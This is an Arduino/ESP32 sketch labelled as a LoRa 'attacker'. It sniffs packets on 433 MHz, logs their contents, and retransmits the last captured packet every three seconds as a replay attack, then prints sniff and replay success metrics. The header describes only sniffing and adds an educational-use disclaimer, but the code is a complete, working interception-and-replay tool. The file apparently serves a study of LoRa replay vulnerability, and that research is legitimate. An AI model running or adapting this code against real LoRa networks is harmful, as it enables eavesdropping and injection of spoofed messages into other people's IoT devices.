/*
ATTACKER / SNIFFER LoRa
--------------------------------
Author: Mohammad Rizki  Fadillah
Description:
This code implements a LoRa sniffer that listens for LoRa packets on a specified frequency and prints the received data along with signal strength (RSSI) and signal-to-noise ratio (SNR). It uses the LoRa library to interface with the LoRa module and the SPI library for communication. The sniffer is configured to use specific pins for SS, RST, and DIO0, and it sets the spreading factor, signal bandwidth, and coding rate to match the sender's configuration. The code continuously checks for incoming packets and prints their contents when detected.
This code is for educational purposes only. Unauthorized use may be illegal and unethical. Always obtain proper permissions before conducting any security testing.
--------------------------------
*/

#include <SPI.h>
#include <LoRa.h>

#define SS   5
#define RST  14
#define DIO0 26

// ===== PARAM =====
const uint32_t EXPECTED = 200;
const unsigned long TIMEOUT = 50000;
const unsigned long replayInterval = 3000;

// ===== DATA =====
String lastPacket = "";
unsigned long lastReplay = 0;
unsigned long lastRecvTime = 0;

bool started = false;
bool done = false;

// ===== METRICS =====
uint32_t sniffedCount = 0;
uint32_t replayCount = 0;
uint32_t uniqueCount = 0;
uint32_t duplicateCount = 0;

bool seen[EXPECTED] = {false};

// ===== PARSE ID =====
bool getID(String data, uint32_t &id) {
  int p1 = data.indexOf(',');
  if (p1 == -1) return false;

  String idStr = data.substring(0, p1);

  for (int i = 0; i < idStr.length(); i++) {
    if (!isDigit(idStr[i])) return false;
  }

  id = idStr.toInt();
  return true;
}

// ===== SUMMARY =====
void printSummary() {
  Serial.println("\n=== ATTACKER SUMMARY ===");

  float sniffRate = (sniffedCount * 100.0) / EXPECTED;
  float replayRate = (sniffedCount > 0) ? (replayCount * 100.0 / sniffedCount) : 0;

  Serial.print("Sniffed: "); Serial.println(sniffedCount);
  Serial.print("Replay Sent: "); Serial.println(replayCount);

  Serial.print("Unique: "); Serial.println(uniqueCount);
  Serial.print("Duplicate: "); Serial.println(duplicateCount);

  Serial.print("Sniff Success (%): "); Serial.println(sniffRate);
  Serial.print("Replay Ratio (%): "); Serial.println(replayRate);
}

void setup() {
  Serial.begin(115200);

  SPI.begin(18, 19, 23, SS);
  LoRa.setPins(SS, RST, DIO0);

  if (!LoRa.begin(433000000)) {
    Serial.println("LoRa init FAILED!");
    while (1);
  }

  LoRa.setSpreadingFactor(7);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(5);

  LoRa.receive();

  Serial.println("Attacker Ready (Sniff + Replay + Summary)");
}

void loop() {
  if (done) return;

  // =========================
  // SNIFF
  // =========================
  int packetSize = LoRa.parsePacket();

  if (packetSize) {
    lastRecvTime = millis();
    started = true;

    String received = "";
    while (LoRa.available()) {
      received += (char)LoRa.read();
    }

    sniffedCount++;

    uint32_t id;
    if (getID(received, id)) {
      if (id < EXPECTED) {
        if (!seen[id]) {
          seen[id] = true;
          uniqueCount++;
        } else {
          duplicateCount++;
        }
      }
    }

    Serial.print("[SNIFF] ");
    Serial.println(received);

    lastPacket = received;
  }

  // =========================
  // REPLAY
  // =========================
  if (lastPacket != "" && millis() - lastReplay > replayInterval) {
    lastReplay = millis();

    Serial.print("[REPLAY] ");
    Serial.println(lastPacket);

    LoRa.beginPacket();
    LoRa.print(lastPacket);
    LoRa.endPacket();

    replayCount++;

    LoRa.receive();
  }

  // =========================
  // TIMEOUT STOP
  // =========================
  if (started && (millis() - lastRecvTime > TIMEOUT)) {
    Serial.println("\n[TIMEOUT] Attack session selesai");
    printSummary();
    done = true;
  }
}